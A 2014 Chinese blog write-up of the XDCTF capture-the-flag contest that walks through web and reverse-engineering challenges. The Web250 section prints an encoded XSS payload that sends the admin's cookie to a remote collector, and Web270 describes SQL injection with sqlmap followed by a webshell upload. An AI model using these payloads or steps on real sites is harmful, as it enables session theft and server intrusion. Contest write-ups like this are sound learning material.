---
id: 105
title: XDCTF-writeup
date: 2014-10-05T14:57:03+00:00
author: admin
layout: post
guid: http://www.ikow.cn/?p=105
permalink: /xdctf-writeup/
categories:
  - CTF
tags:
  - CTF
  - writeup
  - xdctf
  - 攻略
---
**XDCTF2014 Write-ups by ****我们是来打酱油的**

**Member: test233 test234**

本来组了一个队，但是我要复习英语就没打算做题，但是一天过后发现队友根本没有做题，我就醉了，难道题目很难么。。简单看了下题不是很难，试着做了几道web的题，然后发现狮子骑士也是一个人在做题，果断和逆向大牛重新组了一个队“我们是来打酱油的”，最后做了挺多题，可惜做的时间比较迟，奖励分都没有了，其实看了下和9、10名的队做的题是一样的，别人做的早有奖励分，不然可以进线下赛。骑士牛还是非常给力的，搞定了好几道逆向题，下面是这次比赛的writeup:

l  **Web**

WEB20

Web50

Web70

Web100

WEB200

Web150

Web180

WEB250

WEB270

l  **Crack**

Crack100

Crack120

Crack150

Crack300

Crack180

&nbsp;

&nbsp;

&nbsp;

&nbsp;

**Web20**

打开题目连接，提示是Happy Easter, 网页中有张图片是个复活节的彩蛋图，抓包看了下网页是用PHP写的，上网搜了下PHP彩蛋，于是按照说明，访问下面的URL：

<http://game1.xdctf.com:8081/H86Ki4NnCSVv/?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000>

在返回的页面里面找到了flag信息：

Flag: flag-WhatisPhp-mtzeXAtcKA53

&nbsp;

&nbsp;

&nbsp;

**Web50**

下载XSS编码神器，解压后发现是个chrome插件文件，把后缀改成RAR再解压：

挨个打开，在manifest.json里发现：

把

dGhlIGZvbGxvd2luZyBrZXkgaXMgbm90IHRoZSByZWFseSBrZXksIHlvdSBjYW4gZmluZCBpbiB0aGUgb3RoZXIgZmlsZSE=

base64解码后得到：

the following key is not the realy key, you can find in the other file!

可见key不是这个（出题的基友单词写错了），查看其他的文件，最后发现fuck.jpg中有一段数字：

解码后：

得到key：XDSec@2O14

&nbsp;

&nbsp;

**Web70**

用jother编码xss poc代码成功绕过，发送邮件得到key：

XsSXD$3(201X@xiD@n

&nbsp;

** **

**Web100**

查看网页源代码，发现有张隐藏的图片，打开看是张二维码，过段用手机扫一扫，结果打开是个空白，把解码的东西发到电脑上发现是个网址加上 RGB，打开链接是微信公众号发布的一个图文消息：

<http://mp.weixin.qq.com/s?__biz=MjM5Njc3NjM4MA==&mid=200689499&idx=2&sn=76a5cb177facf0ca76dfcc2db7e135cf#rd>

发现是一种代码隐藏在图片中的新技术，根据提示关注微信号回复得到网址（这尼玛还有广告）：

<http://www.secureworks.com/cyber-threat-intelligence/threats/malware-analysis-of-the-lurk-downloader/>

根据文中的方法，把RGB中B的bytes提取出来，然后8位一组进行重组，最后得到KEY：

Xd$eC@2o14

**Web200**

题目提示是一个python写的网站，需要尝试获得flag，并提示看help。首先访问/help，可以得到readme的提示，访问/read，可以获取网站的py代码，但是一次只有两行。尝试了几次，由于代码有重复行，没想到有好的自动化方法，于是就手动收集吧 0.0

最终经过不懈努力和拼接，收集到了网站的python代码完整版（貌似是对的……）：

然后看到博客里面的提示：

<http://www.leavesongs.com/PENETRATION/web-py-runcode-tip.html>

so…直接访问getflag，传参数unabletoread为le4f.net，抓包即可以在HTTP里面获取到flag:

XDCTF{X1di4nUn1Vers1tySecT3AM}

&nbsp;

**Web150**

本地搭了个PHP环境，然后进行抓包，看到有stmp的密码，就是key:

XDSE@L0VEr2014

**Web180**

首先下载了整站源码，在网站根目录下发现about.asp的大马，发现一个qq:2725629821，这个应该是入侵者的qq，根据题目要求需要找到昵称和身份证号码，于是查找一下这个qq号，

根据上面的信息得到了昵称：gh0st2014

和身份证前几位：61011619850507

在他空间中找到了这张图片：

于是还原出身份证号码：610116198505073895提交了发现不对，应该是地区对应的号码有问题，用burp进行爆破，最后发现正确的是：

gh0st2014

610121198505073895

登陆后获得key：

key:Welcome@Xidan$@clov@r

&nbsp;

**Web250**

登陆后发现是个留言板，需要插入xss代码，从管理的cookie里获取flag，测试了多组，发现过滤了：&#8221;  &#8216;  =   (  )    \   document

但是只要 插入[string]都会变成<string>

于是利用<svg><script>html编码后的code<script>进行绕过：

插入如下代码：

\[svg\]\[script\]&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#108;&#111;&#99;&#97;&#116;&#105;&#111;&#110;&#61;&#34;&#104;&#116;&#116;&#112;&#58;&#47;&#47;&#98;&#98;&#115;&#46;&#100;&#117;&#116;&#115;&#101;&#99;&#46;&#99;&#110;&#47;&#49;&#46;&#112;&#104;&#112;&#63;&#99;&#61;&#34;&#43;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#111;&#111;&#107;&#105;&#101;&#59;[/script]

其中远程1.php进行接受：（是不是人工审核的，晚上11点提交的，第二天早上才收到cookie）

xdctf\_xss\_flag=flag-twEizeCWW6ChsXpEIbZxtx7D

**Web270**

<http://ph.xdctf.com:8082/> 目标网站看了下，啥也没有，所以从同服网站下手

<http://hlecgsp1.xdctf.com:8082/>

打开发现是个phpok 4.x的网站，果断到wooyun上去找poc

试了几个直接getshell的都不好用

发现有个sql注入：

[http://hlecgsp1.xdctf.com:8082/api.php?c=api&f=phpok&id=_project&param[pid]=1](http://hlecgsp1.xdctf.com:8082/api.php?c=api&f=phpok&id=_project&param%5bpid%5d=1)

表比较多，直接放到sqlmap中跑，得到账号密码，密码MD5破解后登陆网站后台，在模板管理那可以上传shell

利用大马搜索功能：搜索flag：

打卡文件后找到1、2、4三题的flag：

flag-3rdf1agis0nth155erver

flag-letmeshowyoushell

flag-ICanReadAllFileOnTheServer

第三个flag看样子应该在ph这个网站目录下，但是shell无法执行命令，提权也就不行了，应该是要绕过网站目录限制，在网上搜索了各种poc，发现了/fd大神写的神器（<http://www.jinglingshu.org/?p=4989>）成功读到了ph网站目录：

得到第三个flag：flag-whyflagisastupidfilename

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

**Crack100**

这道题目给了一个加密程序和加密之后的文件，逆加密之前的文件，好吧……看了看是.NET程序，直接上Reflector，可是貌似加了混淆，于是再用de4dot去混淆，就可以看到用于加密的C#代码了：

然后依旧是进行加密算法的逆向和分析，首先通过加密后文件，逆推smethod_3之前结果（这里自己脑残的地方是没用发现牵扯到编码问题，加密后文件是UTF-8的，如果直接扔到十六进制分析工具得到的ASCII码没办法去逆，需要先保存成ASCII码编码文件，再去逆……）编码后：

A2A4A6A199AD9EA8A1A2A4A39BA89FA79FA498AF9EA9A5A294AE9CA6A0A 294AF96ACA3A1A3A4A3A3A1A299AA98AA96ADA2A196AF9BA79AACA0A69D AA9EA496B09CA99FA5A1A49EA6A0A4A0A3A2A1A1A29EA5

于是，后来发现hint，flag是44位，果断分析0x2c那个分支，核心算法在smethod_5，和之前ALICTF的逆向200差不多，也是2位对应1位，高4bit和低4bit分别还原，果断去暴力还原：

得到中间结果：cplg1r7f3~xq-%!>+@sb19)<0^&key#oXDSEC2014

这个是41位，需要对最后的9位再逆smethod\_1和smethod\_0，分别是

base64加密和一个诡异的异或处理（没仔细看，依旧一位一位暴力了……），最后得到最终的44位flag:

cplg1r7f3~xq-%!>+@sb19)<0^&key#o==4102cesdx=

&nbsp;

**Crack120**

这道题目下载时有一个加密之后的data文件和一个脚本。后来看到一篇文章，想到可能是pyc文件：<http://iamsk.info/2013/07/24/a-python-2.7-pyc-decompiler/>

果断在本机试了一下……

接下来就是慢慢分析算法了，核心代码是：

大概就是将加密前的文件按字节流进行处理，从低位到高位，先取当前bit为type，做输出密文的最高位，然后找到不同的时候记录是第几个字符找到的不同（‘0’和‘1’），与type组合输出到密文，type做01互换，然后再继续往下找，以此类推……

默默地写了个程序去逆这个算法，就是根据之前的算法逆推，核心代码如下：

最后得到加密之前的文件，有JFIF文件头，果断改后缀，发现flag：

Key: xidianZ0L4 weLc0me y0u

** **

**Crack150**

将下载下来的apk反编译，打开后找了一圈没找到key的代码，看到assets文件夹下有个k.jpg，这个应该是key所在的文件夹了，查看了下图片信息，发现结尾有个dex头：

&nbsp;

&nbsp;

应该是个dex文件，导出后发现key就是key的16位md5加密后的字符串（这句话怎么听起来这么别扭）

**Crack300**

查看了代码后发现是RC4解密，没有密钥只能写程序爆破，爆破得出的解密密钥为：X@3!F，解密出的明文为：XDCTF{omgwtfjusthappenedtherethen}

** **

**Crack180**

打开提供的crypt.txt，数字加上一堆大写的AABB，应该是培根加密了：

用python写了个解密程序：

import re v= [&#8216;AAAAA&#8217;,&#8217;AAAAB&#8217;,&#8217;AAABA&#8217;,&#8217;AAABB&#8217;,&#8217;AABAA&#8217;,&#8217;AABAB&#8217;,&#8217;AABBA&#8217;,&#8217;AABBB&#8217;, &#8216;ABAAA&#8217;,&#8217;ABAAA&#8217;,&#8217;ABAAB&#8217;,&#8217;ABABA&#8217;,&#8217;ABABB&#8217;,&#8217;ABBAA&#8217;,&#8217;ABBAB&#8217;,&#8217;ABBBA&#8217;, &#8216;ABBBB&#8217;,&#8217;BAAAA&#8217;,&#8217;BAAAB&#8217;,&#8217;BAABA&#8217;,&#8217;BAABB&#8217;,&#8217;BAABB&#8217;,&#8217;BABAA&#8217;,&#8217;BABAB&#8217;, &#8216;BABBA&#8217;,&#8217;BABBB&#8217;] f = open(&#8216;jiemi.txt&#8217;,&#8217;r&#8217;) a = f.readline() for i in range(0,26): a = re.sub(v[i],chr(i+97),a) f1 = open(&#8216;result.txt&#8217;,&#8217;wb&#8217;) print a f1.write(a) f1.close()

然后我们进行测试，看下传输的过程，用nc连接game1.xdctf.com   端口，50008，注册账号test233，得到密码：1aecb99868955b4a4e83a68a2842c7ac，然后给Le4f转账，出现同crypt.txt中的字符串：

595270AABAA5853AAAAB133AABAA07AAAABAAABBAAAAB5AAABB7AABAB 827AAABB0AAABBAABAB6AAAAA910AAABBAABAA23289280801AABABAAA AAAABAAAABABAAABBAAABB4078AABAA56AABAB1AAAAAAABAAAAABAAAA AB99868955AAAAB4AAAAA4AABAA83AAAAA68AAAAA2842AAABA7AAAAAA AABA53AAAAB5AABABAABABAAABAAAAAA9281AABAAAAABA958AAAABAAB AB38AABAB1AAAAA89AAAABAAABB12AAABB57AAABB4AAABA01AAAAB242 927AAAABAABAA0643AABAB06AABABAAAABAABAA29AAAAB10AAAAAAABAA

同样用程序进行处理，然后我们进行比较发现：

第一部分和最后一部分是公共的，第二段是密码，所以我们得到Ph账户密码是：

b8c2b5c881f2b7f58a096a367a32be33，根据题目提示进行操作：

成功得到key：

xdctf{d4d5906bb2f30b3bbbc1d915e6ba0f7321}

&nbsp;